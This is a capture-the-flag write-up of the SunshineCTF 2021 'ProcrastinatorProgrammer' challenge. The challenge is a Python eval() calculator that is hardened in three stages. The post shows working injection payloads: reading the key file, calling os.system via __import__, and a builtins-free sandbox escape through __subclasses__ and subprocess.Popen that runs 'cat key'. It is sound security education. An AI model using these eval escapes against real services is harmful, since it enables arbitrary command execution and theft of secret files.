---
title: 'SunshineCTF 2021: ProcrastinatorProgrammer'
date: 2021-09-19T00:00:00+00:00
author: Kris
layout: post
image: /images/2021/sunshine/sunshinetitle.png
categories:
  - Write-Ups
  - Python
---
A fun CTF with some good story telling in the Reverse Engineering category. This challenge was a fun quick 150 points because I'd had a bit of [practice](https://ctf.rip/write-ups/web/tmuctf-injection/) with the domain recently! 

#### <a name="procrastinator"></a>ProcrastinatorProgrammer - Scripting - 150 points

This challenge reads:

```
I may have procrastinated.

This may be a mistake.

Or mistakes were made.

I may have procrastinated security for procrastinate.chal.2021.sunshinectf.org 
65000. I may have been watching too many Tom Cruise movies instead of releasing 
this... uh... last year.

But don't worry! The keys to the kingdom are split into three parts... you'll 
never find them all!

Flag will be given by our backend in the standard sun{} format, but make sure 
you put all the pieces together!

Notes:

Need help on your math? If so? ProcrastinatorProgrammer is your buddy!

Send equations our way, and we'll solve them your way!

Example Usages
Send an equation, like

	cos(5) + sin(7)

and we'll send an answer! In this case, 0.9406487841820153.

Need more complicated equations? No problem! Our python3 backend can handle 
anything you throw at it.

    fsum([.1, .1, .1, .1, .1, .1, .1, .1, .1, .1]) + gcd(19,29,39,49,59,69)
    =>2.0

Note: In the future we may disable components if we find there's security 
issues with them.
```

Connecting to the server we're given a prompt for a math equation.

```shell
$ nc procrastinate.chal.2021.sunshinectf.org 65000
Welcome to the ProcrastinatorProgrammer backend.
Please give me an equation! Any equation! I need to be fed some data to do some 
processing! I'm super secure, and can use all python! I just use `eval()` on 
your data and then whamo, python does all the work!Whatever you do, don't 
look at my ./key!

Give me an equation please!
```

Given it says its an open eval, i try the first thing that comes to mind and open() the key.

```
open('key').read()
sun{eval_is

If you completed part 1 of the challenge...

Your princess is in another castle! 🔥🏰🔥

procrastinate-castle.chal.2021.sunshinectf.org 65001 holds your next clue.
```

Which works and we get part 1 of the flag, we then follow the directions onto the next phase and the new port number `65001`:

```
$ nc procrastinate.chal.2021.sunshinectf.org 65001
Welcome to the ProcrastinatorProgrammer backend.
Please give me an equation! Any equation! I need to be fed some data to do 
some processing!Due to technical difficulties with the last challenge, 
I've upped my ante! Now I know it's secure!I'm super secure, and can 
use most python math! I just use `eval(client_input, \{\}, safe_math_functions)` 
on your data and then whamo, python does all the work!Whatever you do, 
don't look at my ./key!

Halt in the name of the law!

What was the ./key found in the previous challenge?
```

Which we know is `sun{eval_is` so we send that and receive our challenge:

This challenge also gave itself away immediately though because the first thing I tried was `dir()`

```shell
Give me an equation please!

dir()
['abs', 'acos', 'asin', 'atan', 'atan2', 'ceil', 'cos', 'cosh', 'degrees', 
'e', 'exp', 'fabs', 'floor', 'fmod', 'frexp', 'hypot', 'ldexp', 'log', 
'log10', 'math', 'modf', 'pi', 'pow', 'radians', 'sin', 'sinh', 'sqrt', 
'tan', 'tanh']
```

And so even though there's a "safe list", builtins still exist so I tried: `__import__('os').system('cat key')` ...

```
Give me an equation please!

__import__('os').system('cat key')
_safe_

If you completed part 2 of the challenge...

You need sequels. MORE SEQUELS!! 🔥🏰🔥

procrastinate-sequel.chal.2021.sunshinectf.org 65002 holds your next clue.
```

And now we have 2 parts of the flag... on to part3. For this part they were more careful:

```
$ nc procrastinate.chal.2021.sunshinectf.org 65002
Welcome to the ProcrastinatorProgrammer backend.
Please give me an equation! Any equation! I need to be fed some data to do 
some processing!Due to technical difficulties with the previous set, I had 
to remove math lib support! In fact the only thing this can do is add and 
subtract now!... I think. Google tells me that it's secure now! Well the 
second result anyhow.I'm super secure, and can use a bit of python math! 
I just use `eval(client_input, {'__builtins__':\{\}})` on your data and 
then whamo, python does all the work!Whatever you do, don't look at my 
./key!

Halt in the name of the law!

What was the ./key found in the previous challenge?

_safe_
Give me an equation please!

__import__('os').system('cat key')
Process Process-1:
Traceback (most recent call last):
  File "/usr/local/lib/python3.9/multiprocessing/process.py", line 315, in _bootstrap
    self.run()
  File "/usr/local/lib/python3.9/multiprocessing/process.py", line 108, in run
    self._target(*self._args, **self._kwargs)
  File "/app/server-challenge-3.py", line 39, in test_client
    print(eval(client_input, {'__builtins__': {}}, safe_dict) or "")
  File "<string>", line 1, in <module>
NameError: name '__import__' is not defined

```

But still it's hard to remove everything in Python. We have `magic methods` on types that make it possible to escape still. Let's see if they work:

```
Give me an equation please!

().__class__.__base__.__subclasses__()

[<class 'type'>, <class 'weakref'>, <class 'weakcallableproxy'>, 
<class 'weakproxy'>, <class 'int'>, <class 'bytearray'>, <class 'bytes'>, 
<class 'list'>, <class 'NoneType'>, <class 'NotImplementedType'>, 
<class 'traceback'>, <class 'super'>, <class 'range'>, <class 'dict'>, 

... many classes ...

<class 'contextlib._GeneratorContextManagerBase'>, <class 'contextlib._BaseExitStack'>, 
<class 'subprocess.CompletedProcess'>, <class 'subprocess.Popen'>, 
<class 'multiprocessing.util.Finalize'>, <class 'multiprocessing.util.ForkAwareThreadLock'>, 
<class 'multiprocessing.popen_fork.Popen'>]
```

Yup! 

And the eagle eyed among you will see the super useful class loaded `subprocess.Popen` at index 219 there. The next step is one I've used a few times lately, calling that by index and using the `communicate` method to RCE and receive the output via `stdout`.

```
Give me an equation please!

().__class__.__base__.__subclasses__()[219](('cat','key'),stdout=-1).communicate().__getitem__(0)
b'only_if_you_ast_whitelist_first}'

If you completed part 3 of the challenge...

 just sum the three clues together to get the flag. 
 It's a three-part equation, very complicated.
```

Putting all the pieces together gives us: `sun{eval_is_safe_only_if_you_ast_whitelist_first}`:)

